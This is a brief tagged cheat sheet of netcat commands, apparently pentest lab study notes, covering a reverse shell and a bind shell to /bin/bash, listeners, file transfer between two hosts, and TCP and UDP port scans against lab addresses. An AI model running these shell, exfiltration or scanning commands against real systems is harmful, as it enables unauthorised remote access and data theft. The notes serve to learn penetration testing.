#tool #network #reverseShells 


##### Connecting to a port 

```bash
nc -nv 10.11.0.22 4444 -e /bin/bash ## reverse shell, nc -nlvp 4444 -e /bin/bash
```

##### Listning to a Port 

```bash
nc -nlvp 4444
```

##### File transfer

**Server**
```bash
nc -nlvp 4444 > outfile
```

**Client**
```bash
nc -nv 10.11.0.22 4444 < infile
```


#### Port scan 
#portscan

**TCP**

```bash
nc -nvv -w 1 -z 10.11.1.220 3388-3390
```

**UDP**
```bash
nc -nv -u -z -w 1 10.11.1.115 160-162
```



